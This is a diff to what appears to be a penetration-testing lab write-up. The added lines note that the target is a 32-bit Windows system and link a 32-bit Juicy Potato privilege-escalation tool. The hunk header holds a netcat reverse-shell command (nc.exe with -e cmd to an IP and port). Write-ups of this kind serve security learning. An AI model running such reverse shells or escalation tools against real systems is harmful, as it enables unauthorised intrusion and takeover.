@@ -63,3 +63,12 @@ nc.exe 192.168.49.54 1234 -e cmd
 <figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+It does not work and we see that this is a 32 bit system with the systeminfo command:
+
+<figure><img src="../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>
+
+So i download juicy potato 32 bit:
+
+{% embed url="https://github.com/k4sth4/Juicy-Potato/tree/main/x86" %}
+
